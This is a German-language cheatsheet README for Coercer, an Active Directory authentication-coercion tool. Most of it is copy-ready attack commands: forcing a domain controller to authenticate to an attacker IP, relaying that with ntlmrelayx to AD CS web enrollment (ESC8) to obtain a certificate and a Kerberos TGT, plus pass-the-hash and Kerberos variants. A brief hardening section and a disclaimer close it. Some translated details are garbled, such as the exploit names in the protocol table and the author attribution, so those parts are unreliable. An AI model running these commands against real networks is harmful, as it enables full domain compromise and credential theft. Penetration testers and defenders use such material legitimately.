<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Automatisches Scannen, Erkennen und Zwingen von Windows-Servern und Domänencontrollern zur Authentifizierung bei beliebigen Computern über mehr als 12 RPC-Protokolle</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht und das Authentication Coercion Primitive](#-overview--the-authentication-coercion-primitive)
- [Unterstützte RPC-Protokolle und -Methoden](#-supported-rpc-protocols--methods)
- [Installation](#-Installation)
- [Scannen nach anfälligen RPC-Schnittstellen (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Authentifizierungszwang wird ausgeführt (`coerce`)](#-executing-authentication-coercion-coerce)
- [Die vollständige Angriffskette: Coercion -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Protokoll- und Methodenfilterung](#-protocol--method-filtering)
- [Kerberos- und Pass-the-Hash-Unterstützung](#-kerberos--pass-the-hash-support)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Härtung](#-defensive-überlegungen--härtung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und das Authentifizierungszwangsprimitiv

In Active Directory-Umgebungen ist **Authentifizierungszwang** ein verheerendes Angriffselement. Es nutzt ältere RPC-Schnittstellen aus, die in Windows-Diensten implementiert sind und es einem authentifizierten Benutzer ermöglichen, einen Remotecomputer (z. B. einen Domänencontroller) aufzufordern, eine Verbindung zu einem bestimmten UNC-Pfad (`\\attacker\share`) herzustellen.

Wenn der Remote-Windows-Computer eine Verbindung zum vom Angreifer kontrollierten Computer herstellt, initiiert er die **Maschinenkonto-NTLM-Authentifizierung** (`DC01$`). 

Durch das Erfassen oder Weiterleiten dieser Computerkonto-Anmeldeinformationen mithilfe von `ntlmrelayx` an Active Directory-Zertifikatdienste (AD CS-Webregistrierung – ESC8) oder uneingeschränkte Delegierungsziele können Angreifer eine **sofortige vollständige Domänenkompromittierung** erreichen.

**Coercer** wurde von **Clément Notin (p0dalirius)** verfasst und vereint über ein Dutzend einzelne Zwangs-Exploits (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) in einem einzigen, automatisierten, hochmodularen Framework.

---

## 🔌 Unterstützte RPC-Protokolle und -Methoden

Coercer testet und nutzt die folgenden RPC-Schnittstellen:

| Protokollname | Allgemeiner Exploit-Name | Rohr/Schnittstelle |
|--------------|---------------------|----|
| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug / SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
| **MS-PAN** | PrintNightmare nebenan | Remote-Druckverwaltung |
| **MS-SAMR** | Käsen | Sicherheitskontomanager |

---

## 📥 Installation
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Scannen nach anfälligen RPC-Schnittstellen (`scan`)

Bevor Sie eine Zwangsmaßnahme auslösen, scannen Sie sicher die Zieldomänencontroller, um herauszufinden, welche RPC-Funktionen aktiviert und erreichbar sind:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Authentifizierungszwang wird ausgeführt (`coerce`)

Lösen Sie eine ausgehende Maschinenkonto-NTLM-Verbindung vom Ziel-DC zu Ihrem Listener aus:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 Die vollständige Angriffskette: Zwang -> NTLM-Relay -> AD CS ESC8

Der kanonische Domain-Eskalationsvektor:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Protokoll- und Methodenfilterung

Zielen Sie auf eine bestimmte Methode, ohne das gesamte RPC-Spektrum zu spammen:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Kerberos- und Pass-the-Hash-Unterstützung
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **DC nach Zwang durchsuchen** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Authentifizierung erzwingen** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Zwang über MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Zwang über MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Pass-the-Hash-Zwang** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Kerberos-Ticketzwang** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Defensive Überlegungen und Abhärtung

1. **Druckspooler auf Domänencontrollern deaktivieren:** Der Druckspoolerdienst (`spoolsv.exe`) sollte auf Domänencontrollern (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`) vollständig deaktiviert sein.
2. **Erweiterten Schutz für die Authentifizierung (EPA) aktivieren:** Aktivieren Sie auf AD CS IIS-Servern EPA und erfordern Sie HTTPS, um NTLM-Relay-Angriffe zu blockieren.
3. **RPC-Filterung und Netzwerksegmentierung:** Beschränken Sie den RPC-Endpunkt-Mapper-Zugriff (TCP-Port 135) auf autorisierte administrative Subnetze.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Coercer löst aktive Remote-Authentifizierungsaufrufe aus, die ungepatchte Domänendienste destabilisieren können. Verwendung ausschließlich bei autorisierten Penetrationstests und mit ausdrücklicher Zustimmung des Kunden.